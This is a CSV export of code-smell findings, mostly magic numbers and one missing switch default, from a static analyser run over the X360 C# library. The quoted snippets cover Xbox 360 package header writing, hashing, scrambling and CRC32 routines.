Implementation smell,Namespace,Class,File,Method,Description
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,SVODPackage,The following statement contains a magic number: xIsShifted = (((xHeaderIO.ReadByte () >> 6) & 1) == 1);  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,SVODPackage,The following statement contains a magic number: if (xDataFiles.Length > 9999 || xDataFiles.Length == 0)  	throw SVODExcepts.Count;  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: try {  	DJsIO xio = new DJsIO (true);  	xHeaderData.Write (ref xio);  	xio.SetLength (0xB000);  	xio.Position = 0x340;  	xio.Write ((uint)0xAD0E);  	xio.Position = 0x379;  	xio.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	IO.Position = 0x37D;  	xio.Write (IO.ReadBytes (20));  	xio.Write ((byte)((xIsShifted ? 1 : 0) << 6));  	xio.WriteUInt24 (xBlockCount);  	xio.Write (xDeviation);  	xio.Flush ();  	xio.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (xio.ReadBytes ((int)(xio.Length - 0x344)));  	xio.Position = 0x32C;  	xio.Write (xHash);  	xio.Flush ();  	xio.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (xio.ReadBytes (0x118));  	xio.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		xio.Write (xParams.Certificate);  		xio.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		xio.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		xio.Write (new byte[0x128]);  	}  	xio.IsBigEndian = true;  	xio.Position = 0;  	xio.Write (((uint)xParams.Type));  	xio.Flush ();  	xHeaderData.xMagic = xParams.Type;  	IO.Position = 0;  	IO.Write (xio.ReadStream ());  	IO.Flush ();  	xio.Dispose ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: try {  	DJsIO xio = new DJsIO (true);  	xHeaderData.Write (ref xio);  	xio.SetLength (0xB000);  	xio.Position = 0x340;  	xio.Write ((uint)0xAD0E);  	xio.Position = 0x379;  	xio.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	IO.Position = 0x37D;  	xio.Write (IO.ReadBytes (20));  	xio.Write ((byte)((xIsShifted ? 1 : 0) << 6));  	xio.WriteUInt24 (xBlockCount);  	xio.Write (xDeviation);  	xio.Flush ();  	xio.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (xio.ReadBytes ((int)(xio.Length - 0x344)));  	xio.Position = 0x32C;  	xio.Write (xHash);  	xio.Flush ();  	xio.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (xio.ReadBytes (0x118));  	xio.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		xio.Write (xParams.Certificate);  		xio.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		xio.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		xio.Write (new byte[0x128]);  	}  	xio.IsBigEndian = true;  	xio.Position = 0;  	xio.Write (((uint)xParams.Type));  	xio.Flush ();  	xHeaderData.xMagic = xParams.Type;  	IO.Position = 0;  	IO.Write (xio.ReadStream ());  	IO.Flush ();  	xio.Dispose ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: try {  	DJsIO xio = new DJsIO (true);  	xHeaderData.Write (ref xio);  	xio.SetLength (0xB000);  	xio.Position = 0x340;  	xio.Write ((uint)0xAD0E);  	xio.Position = 0x379;  	xio.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	IO.Position = 0x37D;  	xio.Write (IO.ReadBytes (20));  	xio.Write ((byte)((xIsShifted ? 1 : 0) << 6));  	xio.WriteUInt24 (xBlockCount);  	xio.Write (xDeviation);  	xio.Flush ();  	xio.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (xio.ReadBytes ((int)(xio.Length - 0x344)));  	xio.Position = 0x32C;  	xio.Write (xHash);  	xio.Flush ();  	xio.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (xio.ReadBytes (0x118));  	xio.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		xio.Write (xParams.Certificate);  		xio.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		xio.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		xio.Write (new byte[0x128]);  	}  	xio.IsBigEndian = true;  	xio.Position = 0;  	xio.Write (((uint)xParams.Type));  	xio.Flush ();  	xHeaderData.xMagic = xParams.Type;  	IO.Position = 0;  	IO.Write (xio.ReadStream ());  	IO.Flush ();  	xio.Dispose ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: try {  	DJsIO xio = new DJsIO (true);  	xHeaderData.Write (ref xio);  	xio.SetLength (0xB000);  	xio.Position = 0x340;  	xio.Write ((uint)0xAD0E);  	xio.Position = 0x379;  	xio.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	IO.Position = 0x37D;  	xio.Write (IO.ReadBytes (20));  	xio.Write ((byte)((xIsShifted ? 1 : 0) << 6));  	xio.WriteUInt24 (xBlockCount);  	xio.Write (xDeviation);  	xio.Flush ();  	xio.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (xio.ReadBytes ((int)(xio.Length - 0x344)));  	xio.Position = 0x32C;  	xio.Write (xHash);  	xio.Flush ();  	xio.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (xio.ReadBytes (0x118));  	xio.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		xio.Write (xParams.Certificate);  		xio.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		xio.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		xio.Write (new byte[0x128]);  	}  	xio.IsBigEndian = true;  	xio.Position = 0;  	xio.Write (((uint)xParams.Type));  	xio.Flush ();  	xHeaderData.xMagic = xParams.Type;  	IO.Position = 0;  	IO.Write (xio.ReadStream ());  	IO.Flush ();  	xio.Dispose ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: try {  	DJsIO xio = new DJsIO (true);  	xHeaderData.Write (ref xio);  	xio.SetLength (0xB000);  	xio.Position = 0x340;  	xio.Write ((uint)0xAD0E);  	xio.Position = 0x379;  	xio.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	IO.Position = 0x37D;  	xio.Write (IO.ReadBytes (20));  	xio.Write ((byte)((xIsShifted ? 1 : 0) << 6));  	xio.WriteUInt24 (xBlockCount);  	xio.Write (xDeviation);  	xio.Flush ();  	xio.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (xio.ReadBytes ((int)(xio.Length - 0x344)));  	xio.Position = 0x32C;  	xio.Write (xHash);  	xio.Flush ();  	xio.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (xio.ReadBytes (0x118));  	xio.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		xio.Write (xParams.Certificate);  		xio.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		xio.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		xio.Write (new byte[0x128]);  	}  	xio.IsBigEndian = true;  	xio.Position = 0;  	xio.Write (((uint)xParams.Type));  	xio.Flush ();  	xHeaderData.xMagic = xParams.Type;  	IO.Position = 0;  	IO.Write (xio.ReadStream ());  	IO.Flush ();  	xio.Dispose ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: xio.Write (new byte[] {  	0x24'  	5'  	5'  	0x11  });  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: xio.Write (new byte[] {  	0x24'  	5'  	5'  	0x11  });  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: xio.Write (IO.ReadBytes (20));  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: xio.Write ((byte)((xIsShifted ? 1 : 0) << 6));  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: xio.Position = 4;  
Magic Number,X360.SVOD,SVODFuncs,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,formatstring,The following statement contains a magic number: if (i < 10)  	return "/Data000" + i.ToString ();  
Magic Number,X360.SVOD,SVODFuncs,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,formatstring,The following statement contains a magic number: if (i < 100)  	return "/Data00" + i.ToString ();  
Magic Number,X360.SVOD,SVODFuncs,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,formatstring,The following statement contains a magic number: if (i < 1000)  	return "/Data0" + i.ToString ();  
Magic Number,X360.Security.Cryptography.Kerberos,KerbExtenz,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,NewConfounder,The following statement contains a magic number: for (int i = 0; i < 8; i++)  	xReturn [i] = (byte)xRand.Next (0' 0xFF);  
Magic Number,X360.Security.Cryptography,CRC32,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,CRC32,The following statement contains a magic number: for (uint i = 0; i < crctable.Length; i++) {  	crc = i;  	for (int j = 0; j < 8; j++) {  		if ((crc & 1) == 1)  			crc = (crc >> 1) ^ Polynomial;  		else  			crc >>= 1;  	}  	crctable [i] = (int)crc;  }  
Magic Number,X360.Security.Cryptography,CRC32,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,CRC32,The following statement contains a magic number: for (int j = 0; j < 8; j++) {  	if ((crc & 1) == 1)  		crc = (crc >> 1) ^ Polynomial;  	else  		crc >>= 1;  }  
Magic Number,X360.Security.Cryptography,CRC32,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,AddToCRC,The following statement contains a magic number: crc = (uint)(((crc >> 8) & bitsfilled) ^ crctable [(crc ^ xAdd) & 0xFF]);  
Magic Number,X360.Security.Cryptography,CRC32,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,AddToCRC,The following statement contains a magic number: foreach (byte x in xAdd)  	crc = (uint)(((crc >> 8) & bitsfilled) ^ crctable [(crc ^ x) & 0xFF]);  
Magic Number,X360.Security.Cryptography,CRC32,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,AddToCRC,The following statement contains a magic number: crc = (uint)(((crc >> 8) & bitsfilled) ^ crctable [(crc ^ x) & 0xFF]);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: if ((xPiece.Length % 8) != 0)  	throw new Exception ("Input not divisible by 8");  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < (xPiece.Length / 2); i += 8) {  	xStream.Position = i;  	byte[] xPart1 = xStream.ReadBytes (8);  	xStream.Position = (xPiece.Length - i - 8);  	byte[] xPart2 = xStream.ReadBytes (8);  	xStream.Position = i;  	xStream.Write (xPart2);  	xStream.Position = (xPiece.Length - i - 8);  	xStream.Write (xPart1);  	xStream.Flush ();  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < (xPiece.Length / 2); i += 8) {  	xStream.Position = i;  	byte[] xPart1 = xStream.ReadBytes (8);  	xStream.Position = (xPiece.Length - i - 8);  	byte[] xPart2 = xStream.ReadBytes (8);  	xStream.Position = i;  	xStream.Write (xPart2);  	xStream.Position = (xPiece.Length - i - 8);  	xStream.Write (xPart1);  	xStream.Flush ();  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < (xPiece.Length / 2); i += 8) {  	xStream.Position = i;  	byte[] xPart1 = xStream.ReadBytes (8);  	xStream.Position = (xPiece.Length - i - 8);  	byte[] xPart2 = xStream.ReadBytes (8);  	xStream.Position = i;  	xStream.Write (xPart2);  	xStream.Position = (xPiece.Length - i - 8);  	xStream.Write (xPart1);  	xStream.Flush ();  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < (xPiece.Length / 2); i += 8) {  	xStream.Position = i;  	byte[] xPart1 = xStream.ReadBytes (8);  	xStream.Position = (xPiece.Length - i - 8);  	byte[] xPart2 = xStream.ReadBytes (8);  	xStream.Position = i;  	xStream.Write (xPart2);  	xStream.Position = (xPiece.Length - i - 8);  	xStream.Write (xPart1);  	xStream.Flush ();  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < (xPiece.Length / 2); i += 8) {  	xStream.Position = i;  	byte[] xPart1 = xStream.ReadBytes (8);  	xStream.Position = (xPiece.Length - i - 8);  	byte[] xPart2 = xStream.ReadBytes (8);  	xStream.Position = i;  	xStream.Write (xPart2);  	xStream.Position = (xPiece.Length - i - 8);  	xStream.Write (xPart1);  	xStream.Flush ();  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < (xPiece.Length / 2); i += 8) {  	xStream.Position = i;  	byte[] xPart1 = xStream.ReadBytes (8);  	xStream.Position = (xPiece.Length - i - 8);  	byte[] xPart2 = xStream.ReadBytes (8);  	xStream.Position = i;  	xStream.Write (xPart2);  	xStream.Position = (xPiece.Length - i - 8);  	xStream.Write (xPart1);  	xStream.Flush ();  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: i += 8
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: xStream.Position = (xPiece.Length - i - 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: xStream.Position = (xPiece.Length - i - 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: if (xReverse)  	for (int i = 0; i < xPiece.Length; i += 8)  		Array.Reverse (xPiece' i' 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: if (xReverse)  	for (int i = 0; i < xPiece.Length; i += 8)  		Array.Reverse (xPiece' i' 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < xPiece.Length; i += 8)  	Array.Reverse (xPiece' i' 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < xPiece.Length; i += 8)  	Array.Reverse (xPiece' i' 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: i += 8
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: Array.Reverse (xPiece' i' 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: if ((xPiece.Length % 8) != 0)  	throw new Exception ("Input not divisible by 8");  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: for (int i = 0; i < xPiece.Length; i += xCurrent) {  	Array.Reverse (xPiece' i' xSpot);  	xCurrent = xSpot;  	if (xSpot == 5)  		xSpot = 3;  	else  		xSpot = 5;  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: for (int i = 0; i < xPiece.Length; i += xCurrent) {  	Array.Reverse (xPiece' i' xSpot);  	xCurrent = xSpot;  	if (xSpot == 5)  		xSpot = 3;  	else  		xSpot = 5;  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: for (int i = 0; i < xPiece.Length; i += xCurrent) {  	Array.Reverse (xPiece' i' xSpot);  	xCurrent = xSpot;  	if (xSpot == 5)  		xSpot = 3;  	else  		xSpot = 5;  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: if (xSpot == 5)  	xSpot = 3;  else  	xSpot = 5;  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: if (xSpot == 5)  	xSpot = 3;  else  	xSpot = 5;  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: if (xSpot == 5)  	xSpot = 3;  else  	xSpot = 5;  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: xSpot = 3;  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: xSpot = 5;  
Missing Default,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following switch statement is missing a default case: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
